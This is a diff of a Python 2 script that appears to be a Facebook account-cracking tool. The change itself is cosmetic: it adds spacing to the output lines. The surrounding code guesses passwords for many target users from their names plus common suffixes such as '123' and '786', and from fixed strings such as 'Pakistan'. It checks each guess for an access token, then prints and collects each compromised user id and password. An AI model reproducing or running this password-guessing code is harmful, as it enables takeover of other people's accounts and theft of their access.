@@ -310,7 +310,7 @@ def pilih_super():
 			if 'access_token' in q:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)    											
-				print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass1 + '\n'        										
+				print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass1 + '\n'        										
 				oks.append(user+pass1)
                         else:
 			        pass2 = b['first_name'] + '123'										
@@ -319,7 +319,7 @@ def pilih_super():
 			        if 'access_token' in q:	
 				        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				        z = json.loads(x.text)
-				        print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass2 + '\n'											
+				        print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass2 + '\n'											
 				        oks.append(user+pass2)
                                 else:
 				        pass3 = b['first_name'] + '1234'										
@@ -328,7 +328,7 @@ def pilih_super():
 			                if 'access_token' in q:	
 				                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                z = json.loads(x.text)
-				                print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass3 + '\n'											
+				                print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass3 + '\n'											
 				                oks.append(user+pass3)
                                         else:
 			                        pass4 = b['first_name'] + '12345'									
@@ -337,7 +337,7 @@ def pilih_super():
 					        if 'access_token' in q:	
 						        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                        z = json.loads(x.text)
-						        print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass4 + '\n'									
+						        print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass4 + '\n'									
 						        oks.append(user+pass4)      							
 				                else:
 					                pass5 = '786786'									
@@ -346,7 +346,7 @@ def pilih_super():
 					                if 'access_token' in q:	
 						                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                z = json.loads(x.text)
-						                print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass5 + '\n'									
+						                print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass5 + '\n'									
 						                oks.append(user+pass5)
                                                         else:
 			                                        pass6 = '000786'										
@@ -355,7 +355,7 @@ def pilih_super():
 			                                        if 'access_token' in q:		
 						                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                        z = json.loads(x.text)
-				                                        print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass6 + '\n''											
+				                                        print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass6 + '\n''											
 				                                        oks.append(user+pass6)  								
 					                        else:
 						                        pass7 = 'Pakistan'										
@@ -364,7 +364,7 @@ def pilih_super():
 			                                                if 'access_token' in q:		
 						                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                z = json.loads(x.text)
-				                                                print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass7 + '\n'											
+				                                                print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass7 + '\n'											
 				                                                oks.append(user+pass7)
                                                                         else:
 			                                                        pass8 = b['last_name'] + '123'							
@@ -373,7 +373,7 @@ def pilih_super():
 						                                if 'access_token' in q:	
 						                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                        z = json.loads(x.text)
-						                                        print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass8 + '\n'							
+						                                        print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass8 + '\n'							
 						                                        oks.append(user+pass8)      				
 					                                        else:
 						                                        pass9 = b['last_name'] + '786'							
@@ -382,7 +382,7 @@ def pilih_super():
 						                                        if 'access_token' in q:	
 						                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                z = json.loads(x.text)
-						                                                print '\x1b[1;92m[✓] ✯\x1b[1;92m' + b['name'] + '✯\x1b[1;92m' + user + '\x1b[1;92m✯\x1b[1;92m' + pass9 + '\n'							
+						                                                print '\x1b[1;92m[✓] ✯ \x1b[1;92m' + b['name'] + ' ✯ \x1b[1;92m' + user + '\x1b[1;92m ✯ \x1b[1;92m' + pass9 + '\n'							
 						                                                oks.append(user+pass9)     
 											                                       
 																	
